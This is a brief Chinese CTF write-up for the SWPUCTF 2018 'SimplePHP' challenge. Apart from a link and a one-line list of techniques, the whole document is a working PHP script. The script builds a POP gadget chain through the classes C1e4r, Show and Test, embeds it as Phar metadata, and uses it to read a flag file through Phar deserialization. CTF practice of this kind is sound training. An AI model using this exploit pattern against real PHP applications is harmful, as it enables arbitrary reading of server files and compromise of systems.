# WP
[[SWPUCTF 2018]SimplePHP - 何止(h3zh1) - 博客园](https://www.cnblogs.com/h3zh1/p/12712426.html)
# 知识点
任意文件读取<br />Phar反序列化
```php
<?php
  class C1e4r
{
  public $test;
public $str;
public function __construct($name)
  {
    $this->str = $name;
  }
public function __destruct()
  {
    $this->test = $this->str;
    echo $this->test;
  }
}

class Show
{
  public $source;
  public $str;
  public function __construct($file)
  {
    $this->source = $file;   //$this->source = phar://phar.jpg
    echo $this->source;
  }
  public function __toString()
  {
    $content = $this->str['str']->source;
    return $content;
  }
  public function __set($key,$value)
  {
    $this->$key = $value;
  }
  public function _show()
  {
    if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
      die('hacker!');
    } else {
      highlight_file($this->source);
    }

  }
  public function __wakeup()
  {
    if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
      echo "hacker~";
      $this->source = "index.php";
    }
  }
}
class Test
{
  public $file;
  public $params;
  public function __construct()
  {
    $this->params = array();
  }
  public function __get($key)
  {
    return $this->get($key);
  }
  public function get($key)
  {
    if(isset($this->params[$key])) {
      $value = $this->params[$key];
    } else {
      $value = "index.php";
    }
    return $this->file_get($value);
  }
  public function file_get($value)
  {
    $text = base64_encode(file_get_contents($value));
    return $text;
  }
}

$c1e4r = new C1e4r();
$show = new Show();
$test = new Test();
$test->params["source"] = "/var/www/html/f1ag.php"; //这里必须为绝对地址
$show->str["str"] = $test;
$c1e4r->str = $show;

//echo serialize($c1e4r);

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar，生成后可以随意修改
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($c1e4r); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>



```
